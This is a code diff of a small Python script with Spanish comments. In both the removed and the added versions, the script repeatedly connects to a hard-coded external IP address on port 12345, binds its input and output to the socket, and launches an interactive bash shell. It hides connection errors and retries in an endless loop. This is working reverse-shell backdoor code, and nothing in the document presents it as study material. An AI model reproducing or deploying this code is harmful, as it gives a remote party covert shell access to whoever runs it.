@@ -5,50 +5,42 @@ import time
 import os
 import socket
 
-def ejecutar_script():
+def ejecutar_segundo():
+    # Definir la dirección IP y el puerto del segundo script
+    #IP_SEGUNDO = "10.0.4.43"
+    IP_SEGUNDO = "161.35.147.18"
+    PUERTO_SEGUNDO = 12345
+
+    # Crear el socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Conectar al servidor del segundo script
+    try:
+        s.connect((IP_SEGUNDO, PUERTO_SEGUNDO))
+
+        # Redirigir la entrada y salida estándar al socket
+        subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
+
+    except ConnectionRefusedError:
+        pass  # No imprimir mensaje de error si la conexión es rechazada
+
+def ejecutar_primer_script():
+    # Contador para el número de escaneos
+    counter = 0
+    
     while True:
-        # Iniciar el script 'a' en un proceso separado, silenciando su salida
-        proceso = subprocess.Popen(["./a"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        counter += 1
+
+        # Llamar al segundo script
+        ejecutar_segundo()
 
         # Esperar un tiempo límite
         tiempo_limite = 1  # 1 segundo
-        tiempo_inicio = time.time()
-
-        while time.time() - tiempo_inicio < tiempo_limite:
-            if proceso.poll() is not None:
-                break
-            time.sleep(1)  # Esperar 1 segundo
-
-        # Verificar si el proceso aún está en ejecución
-        if proceso.poll() is None:
-            # El proceso sigue en ejecución después del tiempo límite, terminarlo
-            proceso.terminate()
-        break  # Salir del bucle para no repetir este script indefinidamente en esta función
-
-def intentar_conexion(IP, PUERTO):
-    # Crear el socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect((IP, PUERTO))
-        # Redirigir la entrada y salida estándar al socket
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        # Ejecutar shell interactiva
-        subprocess.call(["/bin/bash", "-i"])
-    except Exception:
-        pass  # Ignorar el error si no se puede conectar
-    finally:
-        s.close()
+        time.sleep(tiempo_limite)
 
 def main():
-    IP = "161.35.147.18"
-    PUERTO = 12345
-    
     while True:
-        ejecutar_script()
-        intentar_conexion(IP, PUERTO)
-        time.sleep(.5)  # Esperar 0.5 segundos antes de volver a intentar
+        ejecutar_primer_script()
 
 if __name__ == "__main__":
     main()
